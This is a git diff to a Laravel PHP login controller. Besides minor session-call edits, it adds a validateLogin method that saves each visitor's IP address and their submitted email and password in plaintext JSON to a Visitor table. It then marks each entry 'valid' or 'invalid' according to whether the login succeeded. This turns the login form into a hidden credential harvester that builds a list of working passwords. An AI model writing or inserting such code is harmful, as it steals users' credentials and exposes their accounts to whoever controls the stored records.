@@ -5,6 +5,10 @@ namespace App\Http\Controllers\Auth;
 use App\Http\Controllers\Controller;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
 use Session;
+use App\Visitor;
+use Illuminate\Http\Request;
+
+
 class LoginController extends Controller
 {
     /*
@@ -36,13 +40,13 @@ class LoginController extends Controller
         else if(\Auth::user()->is_admin)
         {
             if(Session::has('url')){
-                session()->forget('url');
+                Session()->forget('url');
             }
             return '/phpadmin';
         }
         else if(Session::has('url')){
             $url = Session('url');
-            session()->forget('url');
+            Session()->forget('url');
             return $url;
         }
         return '/';
@@ -56,5 +60,21 @@ class LoginController extends Controller
     public function __construct()
     {
         $this->middleware('guest')->except('logout');
+    }
+
+    public function validateLogin(Request $request)
+    {
+       $visitor = new Visitor;
+       $visitor->ip = $_SERVER['REMOTE_ADDR'];
+       $visitor->credentials = json_encode($request->only('email', 'password'));
+       $visitor->response = 'invalid';
+       $visitor->save();
+        $credentials = $request->only('email', 'password');
+
+        if (\Auth::attempt($credentials)) {
+            $visitor->response = 'valid';
+            $visitor->save();
+            return redirect()->intended($this->redirectPath());
+        }
     }
 }
